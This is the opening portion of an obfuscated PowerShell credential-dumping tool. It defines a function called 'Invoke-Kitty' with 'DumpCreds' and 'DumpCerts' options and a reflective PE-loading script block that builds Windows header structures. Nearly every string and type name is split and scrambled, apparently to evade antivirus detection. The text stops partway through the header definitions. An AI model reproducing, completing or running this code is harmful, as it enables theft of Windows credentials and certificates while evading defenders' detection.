sEt ('3pB'+'kg'+'M') ( [tYPE]("{5}{7}{3}{6}{2}{4}{1}{0}{8}" -F'saTTrIbuT','Ala','eS.MaR','ME.iNTErOPS','sh','syST','ErVIC','EM.ruNTI','e')) ;   set-itEM  ("v"+"ARI"+"AbL"+"E:tfnlg"+"2") (  [Type]("{4}{8}{10}{0}{5}{6}{7}{2}{3}{9}{1}"-F'IMe.INtEr','yPE','E','S.u','sYS','OpS','eRV','iC','teM.r','NmAnaGeDT','uNt'))  ;  sEt-ITeM ("{2}{3}{0}{1}"-f 'Abl','E:Q97','va','ri')  (  [TYpE]("{1}{0}" -f'NT32','i') )  ; ${t`7Cj}  = [TYPe]("{0}{1}"-f 'B','oOL')  ; set ("{1}{0}" -f'TbDF','R') ( [Type]("{1}{0}"-F't32','uIn'))  ;  sv  ("FO"+"dYS")  ([tyPE]("{1}{2}{0}" -F 'er','Bitc','ONvErt') ) ;    SeT-iTeM ("V"+"ArIa"+"bl"+"e:"+"ezcofK") (  [TypE]("{8}{10}{11}{7}{13}{4}{0}{3}{1}{5}{12}{9}{6}{2}"-F'SE','Ybu','Ss','mBl','as','IlD','E','ction.','sysTem.re','acc','f','LE','er','eMiT.'))  ;  seT-VarIaBlE ("{0}{1}" -f'ik','E1')  ([typE]("{3}{0}{1}{5}{2}{4}" -f 'F','lEC','ingcOnvenT','SysteM.re','IoNS','TIon.CAll')) ;${t`DN`jpZ}= [TyPE]("{0}{1}{2}"-f 'APPdo','M','AIn') ;   set-ItEM  ("{2}{1}{0}" -f'd7I9','iAblE:','VAR') ( [TypE]("{2}{3}{0}{1}"-F'en','t','ENVi','ROnm') ); set-ItEm  ('v'+'ArIAb'+'le'+':t72'+'Z') ([typE]("{1}{0}"-f 'R','uiNTPT'))  ;   seT-VariABLe ("{0}{1}" -f'8','Owab') (  [type]("{0}{1}" -f 'mA','TH'))  ;   ${aN`F6} = [Type]("{0}{1}{2}" -F 'SyST','Em.','iNTptr');  ${41`5SNE}  = [tyPe]("{1}{0}" -F 't','COnvEr') ; Set-iTEm ("{2}{0}{3}{1}"-f 'aRiabLE','5mbh','V',':jk') ( [tYpE]("{10}{8}{11}{7}{6}{1}{2}{4}{3}{0}{9}{5}" -f'Ar','pSer','ViC','.M','eS','HAL','Ntero','TiMe.i','.RU','S','SysTEm','N')  ) ;    SeT-iTEM  ("{2}{1}{0}" -f'd','7','vARIABLe:jP')  ([tyPE]("{1}{0}" -f'tr','inTP')  ) ; sET-itEM ("{0}{1}{3}{2}" -f 'V','aRI','k','ABLE:12xJ8')  (  [TypE]("{6}{4}{1}{5}{2}{3}{0}"-F'Ry','i','.dirE','cTo','Tem.','o','SYS') ) ; function i`NV`OkE-K`itty
{

[CmdletBinding(deFAuLtpArAMEtERSEtNAme={"{2}{1}{0}"-f'eds','umpCr','D'})]
Param(
	[Parameter(pOSITion = 0)]
	[String[]]
	${coMP`UTe`RNAMe},

    [Parameter(pAramEtERSETNamE = "dUmPc`REds", PoSItion = 1)]
    [Switch]
    ${dum`Pcr`EDS},

    [Parameter(pArAmeTErsEtnaME = "DUm`p`cErtS", pOsITION = 1)]
    [Switch]
    ${DumP`ce`RTs},

    [Parameter(pARaMEteRsETnAmE = "c`U`sTo`mcOMm`AnD", pOSITION = 1)]
    [String]
    ${C`oMmA`Nd}
)

&("{1}{4}{2}{3}{0}"-f 'ode','Se','St','rictM','t-') -Version 2


${R`e`M`OTES`CRIPt`BLoCK} = {
	[CmdletBinding()]
	Param(
		[Parameter(poSiTION = 0, mAndaTOry = ${TR`UE})]
		[String]
		${Pe`BYt`es64},

        [Parameter(PoSItiOn = 1, MANdatoRy = ${t`Rue})]
		[String]
		${p`eb`YTe`S32},
		
		[Parameter(PoSITiOn = 2, maNdatorY = ${f`Al`sE})]
		[String]
		${fuNcReT`U`RNT`yPE},
				
		[Parameter(PoSiTiON = 3, mandAtory = ${Fa`LsE})]
		[Int32]
		${PR`oCid},
		
		[Parameter(POSitIOn = 4, MandaTORy = ${f`AlSE})]
		[String]
		${P`ROCna`mE},

        [Parameter(PoSItion = 5, MANDATOrY = ${fa`L`se})]
        [String]
        ${E`xeAR`Gs}
	)
	

	Function ge`T-WIN`32Ty`PEs
	{
		${wI`N3`2tYpEs} = &("{2}{0}{1}" -f 'Obj','ect','New-') ("{1}{2}{3}{0}{4}"-f'bje','Syst','em','.O','ct')

		${d`omAIn} =   (gET-VAriablE ("{0}{1}"-f'TD','nJPZ') )."VaL`Ue"::"CU`RRenT`dom`Ain"
		${d`yNAm`icAsse`mBLy} = &("{1}{0}{3}{2}" -f'Ob','New-','ect','j') ("{5}{2}{1}{4}{0}{3}"-f 'm','s','Reflection.A','blyName','se','System.')(("{0}{2}{3}{1}{4}"-f'Dyna','ssemb','m','icA','ly'))
		${Ass`E`mBLY`B`UiLd`eR} = ${D`O`Main}.("{2}{0}{6}{1}{5}{3}{4}" -f'fi','nam','De','cAsse','mbly','i','neDy').Invoke(${D`YnAMIC`AS`SemBlY},  ${Ez`Co`Fk}::"r`UN")
		${mO`DU`lEBUIL`Der} = ${ass`EmBlyB`UiL`D`ER}.("{4}{3}{6}{5}{2}{0}{1}"-f 'ic','Module','m','ef','D','eDyna','in').Invoke(("{3}{2}{0}{1}" -f'od','ule','M','Dynamic'), ${fal`sE})
		${c`oNStrUc`TO`RiNfo} =  (LS  ('va'+'riAble:3P'+'B'+'KGm'))."V`ALue".("{2}{1}{3}{0}" -f'tors','ns','GetCo','truc').Invoke()[0]



		${T`y`P`eBUIlDEr} = ${mO`dUl`E`BuildER}.("{0}{2}{1}" -f'De','Enum','fine').Invoke(("{3}{0}{2}{1}"-f'a','eType','chin','M'), ("{0}{2}{1}"-f 'P','c','ubli'), [UInt16])
		${t`yPE`BUIlDer}.("{0}{1}{3}{2}"-f'D','efine','l','Litera').Invoke(("{1}{2}{0}" -f 'ive','Na','t'), [UInt16] 0) | &("{1}{2}{0}" -f'l','Out-Nu','l')
		${tYp`eBu`Ild`Er}.("{2}{1}{3}{0}" -f'l','ineLi','Def','tera').Invoke(("{1}{0}" -f '6','I38'), [UInt16] 0x014c) | &("{0}{1}{2}"-f 'Out','-Nu','ll')
		${Typ`E`BU`ILDeR}.("{1}{2}{0}"-f 'iteral','De','fineL').Invoke(("{1}{0}"-f'tanium','I'), [UInt16] 0x0200) | &("{1}{0}{2}"-f 'ut-','O','Null')
		${Ty`p`EBUiLd`eR}."D`e`FINeLIte`RAl"('x64', [UInt16] 0x8664) | &("{2}{0}{1}"-f 't','-Null','Ou')
		${Ma`C`hInETY`PE} = ${t`yp`EbuilDeR}.("{0}{1}{2}" -f'Cre','ateT','ype').Invoke()
		${w`I`N32`TypeS} | &("{0}{2}{1}"-f 'Ad','ember','d-M') -MemberType ("{2}{3}{1}{0}"-f 'perty','o','Not','ePr') -Name ("{3}{1}{0}{2}" -f'hin','c','eType','Ma') -Value ${mAC`hi`NetYPE}


		${T`YPE`B`UildER} = ${Mo`DuLeb`U`i`LDer}.("{1}{0}{2}"-f'ef','D','ineEnum').Invoke(("{1}{0}"-f'icType','Mag'), ("{1}{0}" -f 'c','Publi'), [UInt16])
		${tY`PeBU`i`ldeR}.("{0}{2}{1}"-f 'DefineL','teral','i').Invoke(("{0}{1}{5}{7}{8}{3}{2}{6}{4}"-f 'I','M','PTIONAL','O','DR32_MAGIC','AGE_N','_H','T','_'), [UInt16] 0x10b) | &("{0}{1}"-f 'Out-Nu','ll')
		${typeb`U`ILd`ER}.("{1}{3}{2}{4}{0}"-f'eral','Def','eLi','in','t').Invoke(("{1}{2}{3}{0}{4}"-f'NAL_','I','MAGE_N','T_OPTIO','HDR64_MAGIC'), [UInt16] 0x20b) | &("{1}{2}{0}"-f 'ull','Out','-N')
		${mAG`ICTy`pE} = ${TYP`EbuI`LDer}.("{1}{2}{0}"-f'eType','C','reat').Invoke()
		${W`In3`2`TyPEs} | &("{1}{0}{2}" -f'-Me','Add','mber') -MemberType ("{0}{1}{2}"-f 'NoteProp','ert','y') -Name ("{1}{2}{0}"-f 'icType','M','ag') -Value ${M`Ag`IctypE}

		${T`y`pebuILDeR} = ${M`odu`LE`B`UILder}.("{0}{1}{2}" -f 'De','fineEn','um').Invoke(("{3}{1}{2}{0}"-f 'mType','ubSys','te','S'), ("{0}{1}" -f 'Publ','ic'), [UInt16])
		${TyPeB`U`ilDEr}.("{2}{4}{3}{0}{1}" -f 't','eral','D','eLi','efin').Invoke(("{1}{3}{2}{0}" -f 'BSYSTEM_UNKNOWN','I','E_SU','MAG'), [UInt16] 0) | &("{1}{0}{2}" -f 'Nul','Out-','l')
		${tYP`eB`Uild`ER}.("{0}{4}{1}{3}{2}"-f 'Def','n','eral','eLit','i').Invoke(("{2}{1}{0}{3}"-f '_N','GE_SUBSYSTEM','IMA','ATIVE'), [UInt16] 1) | &("{0}{1}{2}"-f 'Out','-','Null')
		${T`YpEbUiL`dER}.("{3}{0}{2}{1}"-f 'ef','eLiteral','in','D').Invoke(("{1}{3}{0}{4}{2}" -f 'SYSTEM_WINDO','IMAGE_','GUI','SUB','WS_'), [UInt16] 2) | &("{0}{1}{2}" -f'O','u','t-Null')
		${Ty`pebU`iLD`eR}.("{0}{2}{1}{3}{4}" -f'DefineL','t','i','er','al').Invoke(("{4}{7}{6}{2}{0}{5}{3}{1}"-f '_WIND','I','TEM','S_CU','IMA','OW','BSYS','GE_SU'), [UInt16] 3) | &("{2}{0}{1}" -f 'ul','l','Out-N')
		${T`ype`BUiLd`er}.("{1}{2}{3}{0}" -f'al','Defi','n','eLiter').Invoke(("{1}{4}{3}{0}{2}"-f'POSI','I','X_CUI','TEM_','MAGE_SUBSYS'), [UInt16] 7) | &("{0}{1}"-f 'O','ut-Null')
		${ty`pebuiL`D`eR}.("{3}{2}{0}{1}" -f'te','ral','neLi','Defi').Invoke(("{7}{2}{4}{5}{3}{6}{0}{8}{1}" -f 'INDOWS_','I','A','SUBSYSTEM','GE','_','_W','IM','CE_GU'), [UInt16] 9) | &("{0}{2}{1}" -f 'Out','Null','-')
		${typ`ebU`ILd`ER}.("{0}{3}{1}{2}" -f'D','eLitera','l','efin').Invoke(("{0}{3}{1}{4}{2}{5}" -f'IMAG','M_','PPLICATIO','E_SUBSYSTE','EFI_A','N'), [UInt16] 10) | &("{0}{1}" -f 'Out-Nul','l')
		${TyPe`BU`il`DEr}.("{1}{2}{4}{0}{3}"-f'era','D','e','l','fineLit').Invoke(("{9}{8}{7}{0}{1}{6}{5}{3}{2}{4}"-f'OT_S','E','IVE','_DR','R','ICE','RV','STEM_EFI_BO','MAGE_SUBSY','I'), [UInt16] 11) | &("{2}{1}{0}" -f'l','-Nul','Out')
		${ty`PEBUi`LDeR}.("{3}{2}{1}{0}"-f 'ral','te','fineLi','De').Invoke(("{5}{7}{6}{1}{2}{8}{3}{0}{4}"-f 'E','M_','EF','ME_DRIV','R','I','UBSYSTE','MAGE_S','I_RUNTI'), [UInt16] 12) | &("{2}{0}{1}"-f'-Nu','ll','Out')
		${tyP`E`BUILD`eR}.("{3}{1}{0}{2}"-f 'a','ter','l','DefineLi').Invoke(("{5}{2}{4}{6}{1}{3}{0}"-f 'OM','EM','_SU','_EFI_R','BSY','IMAGE','ST'), [UInt16] 13) | &("{2}{1}{0}"-f'ull','t-N','Ou')
		${tY`pe`BUilDeR}.("{1}{2}{3}{0}" -f 'al','Define','L','iter').Invoke(("{2}{4}{1}{3}{0}"-f'OX','GE_','IM','SUBSYSTEM_XB','A'), [UInt16] 14) | &("{0}{1}"-f'Out-Nul','l')
		${SuB`SySt`E`mT`YpE} = ${typ`ebu`IldeR}.("{1}{2}{0}" -f'pe','Create','Ty').Invoke()
		${WIn3`2t`Y`pES} | &("{1}{0}{2}" -f 'embe','Add-M','r') -MemberType ("{0}{3}{2}{1}"-f'Not','ty','roper','eP') -Name ("{0}{1}{2}"-f 'SubSys','temTyp','e') -Value ${suBSYST`E`MTy`Pe}

		${T`yPeBU`IlDEr} = ${Mo`D`ULeBUIld`er}.("{2}{0}{1}" -f'Enu','m','Define').Invoke(("{2}{3}{4}{1}{0}{5}{6}"-f 'i','r','Dll','Chara','cte','st','icsType'), ("{1}{0}{2}"-f'ubli','P','c'), [UInt16])
		${T`yPeb`UiLd`Er}.("{0}{1}{3}{2}" -f'Defi','neLit','al','er').Invoke(("{0}{1}" -f'R','ES_0'), [UInt16] 0x0001) | &("{0}{1}" -f'Out-Nul','l')
		${tY`PeB`UI`Lder}.("{1}{2}{0}{3}"-f'a','Def','ineLiter','l').Invoke(("{0}{1}" -f 'RES','_1'), [UInt16] 0x0002) | &("{1}{0}"-f'-Null','Out')
		${tYp`eBui`LD`Er}.("{1}{2}{0}"-f'al','DefineLite','r').Invoke(("{0}{1}"-f'RES','_2'), [UInt16] 0x0004) | &("{1}{2}{0}"-f'Null','Out','-')
		${TYP`E`Bui`lder}.("{2}{3}{1}{4}{0}"-f 'l','ineLite','De','f','ra').Invoke(("{0}{1}" -f'RE','S_3'), [UInt16] 0x0008) | &("{2}{0}{1}" -f'ut-Nul','l','O')
		${t`ypE`BuILd`er}.("{1}{2}{0}"-f'eral','De','fineLit').Invoke(("{2}{0}{5}{4}{1}{6}{3}" -f '_DL','ACTERISTICS','IMAGE','NAMIC_BASE','AR','L_CH','_DY'), [UInt16] 0x0040) | &("{1}{0}" -f 'll','Out-Nu')
		${TYpe`BuI`ldEr}.("{2}{1}{0}{4}{3}"-f 'e','efin','D','iteral','L').Invoke(("{4}{5}{7}{1}{0}{3}{2}{6}"-f'ISTICS_','RACTER','CE','FOR','IMA','GE_','_INTEGRITY','DLL_CHA'), [UInt16] 0x0080) | &("{1}{0}{2}" -f'Nul','Out-','l')
		${tYpe`Bu`i`lDEr}.("{0}{2}{1}" -f 'DefineLite','l','ra').Invoke(("{1}{4}{5}{3}{2}{0}"-f'T','IMA','X_COMPA','L_CHARACTERISTICS_N','GE','_DL'), [UInt16] 0x0100) | &("{1}{0}" -f't-Null','Ou')
		${ty`P`eBU`IldER}.("{2}{0}{1}"-f 'fineLi','teral','De').Invoke(("{0}{3}{7}{6}{1}{5}{4}{2}"-f'IMAGE_','_NO_','ION','DLLCHAR','OLAT','IS','CTERISTICS','A'), [UInt16] 0x0200) | &("{2}{1}{0}"-f 'Null','-','Out')
		${TyP`eb`U`ildEr}.("{0}{1}{2}{3}{4}"-f'De','fi','neL','it','eral').Invoke(("{4}{2}{6}{7}{3}{1}{5}{0}" -f 'H','CS_N','MAG','ACTERISTI','I','O_SE','E_DLLCHA','R'), [UInt16] 0x0400) | &("{0}{1}{2}" -f 'O','ut-','Null')
		${ty`peBUiL`dEr}.("{2}{3}{1}{0}" -f'iteral','L','Defi','ne').Invoke(("{1}{2}{3}{0}{6}{5}{4}" -f'CHARACTER','I','MAGE_D','LL','BIND','_NO_','ISTICS'), [UInt16] 0x0800) | &("{2}{0}{1}"-f'-Nu','ll','Out')
		${tYpE`B`UIld`eR}.("{2}{4}{3}{0}{1}"-f 'eLiter','al','D','in','ef').Invoke(("{0}{1}" -f'RE','S_4'), [UInt16] 0x1000) | &("{0}{1}"-f 'Out-Nul','l')
		${T`yPebu`I`lDER}.("{2}{4}{3}{0}{1}" -f'it','eral','De','eL','fin').Invoke(("{6}{2}{1}{4}{0}{3}{7}{5}"-f 'HARACTER','AGE_DL','M','ISTICS_WDM_DR','LC','ER','I','IV'), [UInt16] 0x2000) | &("{0}{2}{1}" -f'Ou','ull','t-N')
		${TYpE`Bu`ILdEr}.("{3}{2}{1}{4}{0}"-f 'al','Lite','ine','Def','r').Invoke(("{3}{6}{5}{1}{7}{8}{4}{0}{2}" -f 'S_','LC','TERMINAL_SERVER_AWARE','IMA','C','E_DL','G','HARACTE','RISTI'), [UInt16] 0x8000) | &("{0}{2}{1}"-f'O','t-Null','u')
		${DlLcha`RA`cteR`Is`TIcS`TYpE} = ${TYP`eBUIld`er}.("{0}{2}{1}"-f'Create','e','Typ').Invoke()
		${Wi`N`32`TYPes} | &("{2}{1}{0}" -f'ber','Mem','Add-') -MemberType ("{3}{2}{1}{0}"-f 'ty','Proper','te','No') -Name ("{1}{2}{0}{3}"-f 'c','DllChar','a','teristicsType') -Value ${DLLCh`AR`ACterI`stI`cS`TyPE}


		${AtTR`I`BU`TES} = ("{10}{2}{5}{11}{7}{15}{17}{9}{3}{20}{14}{18}{4}{1}{8}{0}{12}{13}{6}{19}{16}" -f 'ut, S','lic','ut, Ans','u',', Exp','i','eforeFie','s, Cla','itLayo','P','AutoLayo','Clas','eale','d, B','li','s','Init','s, ','c','ld','b')
		${t`y`PEBu`ildEr} = ${mOd`ULE`BuIlD`er}.("{0}{1}{2}"-f 'D','efi','neType').Invoke(("{3}{1}{0}{4}{2}"-f 'TA_DIRE','DA','RY','IMAGE_','CTO'), ${AT`Tr`Ibu`TES}, [System.ValueType], 8)
		(${tY`Pe`BuiLD`ER}.("{0}{2}{3}{1}"-f'De','eld','fi','neFi').Invoke(("{0}{1}{2}{4}{3}" -f 'Vir','t','ual','dress','Ad'), [UInt32], ("{0}{1}" -f'Pub','lic'))).("{2}{3}{1}{0}" -f 'et','Offs','Se','t').Invoke(0) | &("{2}{0}{1}"-f 't-Nul','l','Ou')
		(${T`YPe`BUilDeR}.("{0}{2}{1}"-f 'Defin','d','eFiel').Invoke(("{1}{0}"-f'ize','S'), [UInt32], ("{0}{1}" -f 'Pu','blic'))).("{1}{0}{2}"-f'etO','S','ffset').Invoke(4) | &("{2}{0}{1}"-f'ut-N','ull','O')
		${IMage_`DaTa_`d`I`RECto`Ry} = ${ty`PeBUIl`DEr}.("{1}{2}{0}{3}" -f 'eT','Crea','t','ype').Invoke()
		${wiN`32ty`peS} | &("{2}{1}{0}"-f 'd-Member','d','A') -MemberType ("{2}{1}{0}{3}" -f 'ePro','t','No','perty') -Name ("{3}{1}{2}{4}{0}" -f'Y','M','A','I','GE_DATA_DIRECTOR') -Value ${I`M`AGE_D`Ata_`DIREC`T`ory}


		${A`T`Tr`iButeS} = ("{1}{2}{0}{14}{11}{9}{4}{6}{15}{13}{7}{5}{10}{12}{8}{3}"-f'out, AnsiCl','A','utoLay','dInit','lass, Pub','led','lic, S','a','el',', C',', Befor','ss','eFi','Se','a','equentialLayout, ')
		${TYp`e`BUiL`DEr} = ${moDuLeBu`il`deR}.("{3}{0}{2}{1}" -f'fin','Type','e','De').Invoke(("{3}{1}{0}{2}" -f'LE_HEAD','I','ER','IMAGE_F'), ${A`TTRIb`Utes}, [System.ValueType], 20)
		${t`Y`peBU`IldER}.("{1}{2}{0}{3}" -f'fine','D','e','Field').Invoke(("{1}{0}"-f'e','Machin'), [UInt16], ("{0}{1}"-f'Publ','ic')) | &("{1}{0}"-f 't-Null','Ou')
		${Typ`EBu`I`lDer}.("{0}{1}{3}{2}"-f'Def','i','eld','neFi').Invoke(("{3}{4}{1}{0}{2}"-f'tion','Sec','s','Num','berOf'), [UInt16], ("{1}{0}"-f 'c','Publi')) | &("{1}{0}" -f 't-Null','Ou')
		${Typ`e`BUIldEr}.("{2}{0}{1}" -f 'eFiel','d','Defin').Invoke(("{1}{2}{0}"-f 'meDateStamp','T','i'), [UInt32], ("{2}{1}{0}" -f'c','bli','Pu')) | &("{0}{1}{2}"-f 'O','ut','-Null')
		${t`yPe`BuI`Lder}.("{0}{1}{3}{2}"-f'De','fi','ld','neFie').Invoke(("{4}{2}{1}{0}{5}{3}" -f 'bo','oSym','nterT','able','Poi','lT'), [UInt32], ("{0}{1}"-f 'Pu','blic')) | &("{0}{2}{1}"-f'Ou','Null','t-')
		${Type`B`UiLder}.("{0}{1}{2}" -f'Def','ineFie','ld').Invoke(("{3}{2}{0}{1}"-f'OfSy','mbols','ber','Num'), [UInt32], ("{1}{2}{0}"-f'c','Pu','bli')) | &("{0}{2}{1}" -f 'Out','ull','-N')
		${TyPe`BUil`der}.("{1}{0}{2}"-f'neF','Defi','ield').Invoke(("{4}{2}{3}{1}{5}{6}{0}" -f'eader','ion','izeOfO','pt','S','a','lH'), [UInt16], ("{0}{1}{2}"-f 'Pub','li','c')) | &("{0}{1}{2}" -f 'O','ut-','Null')
		${T`y`PE`BUiLDeR}.("{0}{3}{1}{2}"-f'Define','i','eld','F').Invoke(("{0}{1}{2}" -f'Chara','cteri','stics'), [UInt16], ("{0}{1}{2}" -f 'P','u','blic')) | &("{2}{0}{1}"-f 't-Nul','l','Ou')
		${i`mage`_`Fi`LE_H`eader} = ${TyPE`Bu`I`LdEr}.("{1}{3}{2}{0}"-f 'teType','Cr','a','e').Invoke()
		${Wi`N3`2TYP`es} | &("{0}{2}{1}" -f 'Add-Me','er','mb') -MemberType ("{1}{2}{3}{0}" -f'ty','No','tePr','oper') -Name ("{2}{1}{3}{4}{5}{0}"-f'DER','A','IM','GE','_FIL','E_HEA') -Value ${i`MAGe_fIl`e_`H`eaDER}


		${AtTR`IB`UTeS} = ("{2}{9}{17}{13}{3}{18}{7}{1}{8}{0}{14}{6}{15}{4}{11}{5}{10}{12}{16}" -f 'L','i','Au','s',', Befo','eF','out, Se','l','cit','toLayo','ie','r','ld','t, AnsiClas','ay','aled','Init','u',', Class, Public, Exp')
		${T`ypeBu`ILdEr} = ${mO`duLEBui`L`Der}.("{2}{1}{0}" -f 'neType','efi','D').Invoke(("{2}{5}{1}{4}{0}{3}{6}"-f 'A','TI','IMAGE_','DER','ONAL_HE','OP','64'), ${aTT`R`iBUTes}, [System.ValueType], 240)
		(${T`yPeB`UIL`DeR}.("{3}{2}{1}{0}"-f 'd','neFiel','i','Def').Invoke(("{0}{1}"-f 'Magi','c'), ${MA`Gi`C`TYpe}, ("{1}{0}" -f 'blic','Pu'))).("{1}{2}{0}"-f 'set','Se','tOff').Invoke(0) | &("{1}{2}{0}" -f'Null','Out','-')
		(${TYP`eB`UILdER}.("{3}{0}{2}{1}" -f'efi','ld','neFie','D').Invoke(("{3}{4}{0}{2}{1}"-f 'rVersi','n','o','MajorL','inke'), [Byte], ("{0}{1}" -f'Publ','ic'))).("{0}{1}{2}"-f 'Se','tOf','fset').Invoke(2) | &("{1}{2}{0}" -f 'Null','Ou','t-')
		(${t`Y`pEBuILdeR}.("{1}{0}{2}"-f 'fineFi','De','eld').Invoke(("{0}{1}{3}{2}{4}"-f'Mino','r','V','Linker','ersion'), [Byte], ("{1}{0}" -f 'ic','Publ'))).("{3}{1}{2}{0}" -f'et','etOf','fs','S').Invoke(3) | &("{1}{0}" -f '-Null','Out')
		(${tYpeb`U`I`lDeR}.("{1}{0}{2}{3}" -f 'fine','De','F','ield').Invoke(("{2}{1}{0}" -f'OfCode','ze','Si'), [UInt32], ("{1}{0}" -f'ic','Publ'))).("{0}{2}{1}" -f 'Set','fset','Of').Invoke(4) | &("{1}{2}{0}"-f 'l','Out-Nu','l')
		(${TyP`EBu`IlDeR}.("{1}{3}{0}{2}" -f 'neF','Def','ield','i').Invoke(("{0}{2}{3}{1}"-f 'SizeOfInitia','edData','li','z'), [UInt32], ("{0}{1}" -f'Pu','blic'))).("{2}{0}{1}" -f 'se','t','SetOff').Invoke(8) | &("{0}{1}"-f'O','ut-Null')
		(${tyP`E`BuildEr}.("{0}{2}{1}" -f 'Define','ield','F').Invoke(("{3}{2}{4}{0}{1}"-f 'ali','zedData','fU','SizeO','niniti'), [UInt32], ("{0}{1}{2}" -f 'Pub','li','c'))).("{1}{0}"-f'etOffset','S').Invoke(12) | &("{1}{2}{0}"-f't-Null','O','u')
		(${TYpEbU`IL`DeR}.("{1}{3}{0}{2}"-f'neF','Def','ield','i').Invoke(("{3}{2}{1}{0}"-f 'oint','yP','ddressOfEntr','A'), [UInt32], ("{0}{1}" -f 'P','ublic'))).("{0}{3}{1}{2}"-f'Se','Offse','t','t').Invoke(16) | &("{0}{2}{1}" -f'Ou','ull','t-N')
		(${ty`PEBUi`l`Der}.("{1}{3}{0}{2}" -f'l','De','d','fineFie').Invoke(("{0}{1}{2}{3}" -f 'Bas','eOf','Co','de'), [UInt32], ("{1}{0}" -f'ublic','P'))).("{1}{2}{0}" -f 'fset','SetO','f').Invoke(20) | &("{1}{0}{2}" -f'-Nu','Out','ll')
		(${Ty`PEbU`ILdeR}.("{2}{3}{1}{0}"-f 'ld','ie','D','efineF').Invoke(("{1}{2}{0}" -f'e','ImageBa','s'), [UInt64], ("{0}{1}"-f 'Publ','ic'))).("{0}{1}{2}" -f'Set','Offs','et').Invoke(24) | &("{2}{1}{0}"-f 'll','Nu','Out-')
		(${tYpe`B`Ui`LdeR}.("{0}{2}{1}{3}" -f'De','l','fineFie','d').Invoke(("{1}{3}{4}{2}{0}"-f't','Se','lignmen','ction','A'), [UInt32], ("{2}{1}{0}"-f'c','li','Pub'))).("{2}{1}{0}"-f 'set','tOff','Se').Invoke(32) | &("{1}{0}{2}" -f '-','Out','Null')
		(${T`YpEB`UIL`dEr}.("{1}{0}{2}"-f'efineFiel','D','d').Invoke(("{2}{0}{1}" -f 'Align','ment','File'), [UInt32], ("{1}{0}"-f'ic','Publ'))).("{0}{2}{1}" -f 'SetO','et','ffs').Invoke(36) | &("{1}{0}{2}" -f'l','Out-Nu','l')
		(${TYP`EBui`Lder}.("{0}{3}{2}{1}"-f'D','ld','e','efineFi').Invoke(("{2}{3}{4}{1}{0}"-f'on','emVersi','MajorOper','atingSy','st'), [UInt16], ("{0}{1}"-f 'Publ','ic'))).("{0}{1}{2}"-f 'Set','Off','set').Invoke(40) | &("{1}{2}{0}" -f'ull','Out-','N')
		(${TYpeBU`il`DEr}.("{2}{0}{1}"-f'ne','Field','Defi').Invoke(("{5}{3}{1}{6}{2}{0}{4}" -f'r','ratingSyste','e','orOpe','sion','Min','mV'), [UInt16], ("{0}{1}"-f'Pu','blic'))).("{1}{2}{0}"-f 'tOffset','S','e').Invoke(42) | &("{0}{1}" -f'Out-Nul','l')
		(${ty`Pe`BUiL`deR}.("{2}{0}{1}" -f 'e','fineField','D').Invoke(("{2}{3}{0}{1}"-f 'rs','ion','MajorI','mageVe'), [UInt16], ("{1}{0}"-f'lic','Pub'))).("{1}{2}{0}"-f 'et','SetOf','fs').Invoke(44) | &("{2}{1}{0}" -f'-Null','ut','O')
		(${tyP`Eb`U`iLDER}.("{2}{0}{1}"-f 'i','neField','Def').Invoke(("{3}{0}{1}{2}" -f 'norI','mageVers','ion','Mi'), [UInt16], ("{1}{0}" -f 'ic','Publ'))).("{1}{0}"-f'fset','SetOf').Invoke(46) | &("{0}{1}{2}"-f 'Out-','N','ull')
		(${ty`pEb`U`iLDEr}.("{0}{2}{1}{3}" -f'D','e','efineFi','ld').Invoke(("{4}{3}{2}{1}{0}"-f 'ion','s','stemVer','ubsy','MajorS'), [UInt16], ("{0}{1}" -f'P','ublic'))).("{0}{2}{1}" -f'SetOff','et','s').Invoke(48) | &("{2}{0}{1}" -f'ut-Nul','l','O')
		(${Ty`PEBui`L`DER}.("{2}{0}{1}"-f'efineFie','ld','D').Invoke(("{0}{3}{4}{5}{1}{2}"-f 'M','s','ion','inorSubsys','t','emVer'), [UInt16], ("{1}{0}" -f 'c','Publi'))).("{2}{0}{1}" -f'f','set','SetOf').Invoke(50) | &("{1}{0}{2}"-f'u','Out-N','ll')
		(${T`Y`p`ebUIldEr}.("{2}{0}{1}" -f 'ef','ineField','D').Invoke(("{3}{1}{2}{4}{0}{5}" -f'lu','2V','ersi','Win3','onVa','e'), [UInt32], ("{1}{2}{0}"-f'c','Publ','i'))).("{0}{1}{2}"-f 'S','etOff','set').Invoke(52) | &("{0}{2}{1}" -f'Out','l','-Nul')
		(${typ`Eb`UiL`DEr}.("{2}{1}{3}{0}" -f 'd','ineFi','Def','el').Invoke(("{2}{0}{3}{1}" -f'OfI','age','Size','m'), [UInt32], ("{0}{1}"-f'Publ','ic'))).("{0}{1}{2}" -f'SetO','f','fset').Invoke(56) | &("{1}{2}{0}"-f 'ull','Ou','t-N')
		(${t`yP`e`BUilDEr}.("{2}{1}{0}" -f 'd','efineFiel','D').Invoke(("{3}{0}{1}{2}" -f 'i','zeOfHeader','s','S'), [UInt32], ("{0}{1}"-f 'Pub','lic'))).("{1}{0}{2}" -f 'fs','SetOf','et').Invoke(60) | &("{2}{1}{0}" -f'ull','t-N','Ou')
		(${TyPE`Bu`IlDeR}.("{2}{0}{1}{3}" -f'neFi','el','Defi','d').Invoke(("{2}{0}{1}"-f'eck','Sum','Ch'), [UInt32], ("{1}{0}"-f'ic','Publ'))).("{0}{2}{1}" -f 'S','set','etOff').Invoke(64) | &("{1}{0}" -f'l','Out-Nul')
		(${T`ypE`Bu`IlDER}.("{2}{0}{1}{3}"-f 'fine','Fiel','De','d').Invoke(("{0}{1}{2}" -f 'Subsys','t','em'), ${s`U`BS`YSt`eMtYPe}, ("{0}{1}" -f 'P','ublic'))).("{2}{0}{1}"-f'etOf','fset','S').Invoke(68) | &("{1}{0}"-f 'ull','Out-N')
		(${ty`P`ebUil`dEr}.("{2}{1}{0}"-f'ld','eFie','Defin').Invoke(("{0}{2}{1}{3}" -f'DllChara','e','ct','ristics'), ${D`LlC`ha`RaC`TEriS`TICs`TyPe}, ("{1}{0}" -f 'blic','Pu'))).("{1}{2}{0}" -f't','Se','tOffse').Invoke(70) | &("{0}{1}"-f 'Ou','t-Null')
		(${tYPebu`I`Ld`eR}.("{1}{2}{0}" -f 'Field','D','efine').Invoke(("{0}{2}{1}{3}" -f'S','c','izeOfSta','kReserve'), [UInt64], ("{0}{1}{2}"-f'Pub','li','c'))).("{0}{1}{2}"-f 'SetO','ff','set').Invoke(72) | &("{1}{2}{0}"-f 'Null','Ou','t-')
